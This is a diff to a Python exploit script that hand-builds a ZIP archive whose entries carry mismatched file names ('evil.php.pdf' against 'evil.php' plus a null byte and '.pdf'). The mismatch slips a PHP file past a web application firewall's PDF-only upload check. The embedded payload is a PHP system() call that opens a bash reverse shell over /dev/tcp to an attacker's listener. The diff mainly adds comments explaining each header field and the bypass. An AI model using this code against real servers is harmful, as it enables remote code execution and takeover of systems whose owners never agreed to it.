@@ -26,7 +26,7 @@ class Zip:
   def build_payload(self,args):
     payload = b"""<?php system("bash -c 'bash -i >& /dev/tcp/""" + args.listener.encode() + b"""/""" + args.port.encode() + b""" 0>&1'"); ?>"""
     length = len(payload)
-    filename1 = b'evil.php.pdf' 
+    filename1 = b'evil.php.pdf'     # https://labs.redyops.com/index.php/2020/04/30/spending-a-night-reading-the-zip-file-format-specification/
     filename2 = b'evil.php\x00.pdf' # name of the file inside of the zip, using a null byte after .php to bypass the waf which wants the extension to be .pdf but we need to exec php code, so the actual filename will be evil.php after getting past the waf and having the file uploaded
     return payload,length,filename1,filename2
 
@@ -44,15 +44,15 @@ class Zip:
     local_file_header += b'\x4f\x4a'         # file modification time, zip up any file, xxd the archive and just these 2 bytes, doesn't really matter
     local_file_header += b'\x1d\x57'         # file modification date, same as above
     crc32_checksum = binascii.crc32(payload)
-    local_file_header += struct.pack('<L',crc32_checksum)        # checksum in little endian format
-    local_file_header += struct.pack('<L',length)                # compressed size
-    local_file_header += struct.pack('<L',length)                # uncompressed size
-    local_file_header += struct.pack('<H',len(filename1))        # filename length
+    local_file_header += struct.pack('<L',crc32_checksum)        # checksum in little endian format, 4 bytes
+    local_file_header += struct.pack('<L',length)                # compressed size, 4 bytes
+    local_file_header += struct.pack('<L',length)                # uncompressed size, 4 bytes
+    local_file_header += struct.pack('<H',len(filename1))        # filename length, 2 bytes
     local_file_header += b'\x00\x00'                             # extra field length
-    local_file_header += filename1 # filename
-    local_file_header += payload   # extra field
+    local_file_header += filename1 # filename, the waf checks this and sees that the file ends in .pdf so it lets the file through
+    local_file_header += payload   # extra field, putting the payload (actual contents of the "pdf") here because it doesnt work if I put it after the filename2 in the central directory header
 
-    # Step 2. Building the central directory record
+    # Step 2. Building the central directory header
     central_directory  = b''
     central_directory += b'\x50\x4b\x01\x02' # signature
     central_directory += b'\x14\x03'         # version
@@ -61,17 +61,17 @@ class Zip:
     central_directory += b'\x00\x00'         # compression
     central_directory += b'\x4f\x4a'         # file modification time
     central_directory += b'\x1d\x57'         # file modification date
-    central_directory += struct.pack('<L',crc32_checksum)        # checksum in little endian format
-    central_directory += struct.pack('<L',length)                # compressed size
-    central_directory += struct.pack('<L',length)                # uncompressed size
-    central_directory += struct.pack('<H',len(filename2))        # filename length
+    central_directory += struct.pack('<L',crc32_checksum)        # checksum in little endian format, 4 bytes
+    central_directory += struct.pack('<L',length)                # compressed size, 4 bytes
+    central_directory += struct.pack('<L',length)                # uncompressed size, 4 bytes
+    central_directory += struct.pack('<H',len(filename2))        # filename length, 2 bytes
     central_directory += b'\x00\x00' # extra field length
     central_directory += b'\x00\x00' # file comment length
     central_directory += b'\x00\x00' # disk # start
     central_directory += b'\x00\x00' # internal attributes
     central_directory += b'\x00\x00\xa4\x81' # external attributes
     central_directory += b'\x00\x00\x00\x00' # offset of local header
-    central_directory += filename2   # filename
+    central_directory += filename2   # filename, this is what actually gets extracted on the webserver
 
     # Step 3. Building the end of the central directory record
     end_of_cd = b''
@@ -80,8 +80,8 @@ class Zip:
     end_of_cd += b'\x00\x00'         # disk # w/cd
     end_of_cd += b'\x01\x00'         # disk entries
     end_of_cd += b'\x01\x00'         #  total entries
-    end_of_cd += struct.pack('<L', len(central_directory)) # central directory size
-    end_of_cd += struct.pack('<L', len(local_file_header)) # offset of cd wrt to starting disk
+    end_of_cd += struct.pack('<L', len(central_directory)) # central directory size, 4 bytes
+    end_of_cd += struct.pack('<L', len(local_file_header)) # offset of cd wrt to starting disk, 4 bytes
     end_of_cd += b'\x00\x00' # comment length
     end_of_cd += b'\x00\x00' # zip file comment
     final_payload = local_file_header + central_directory + end_of_cd
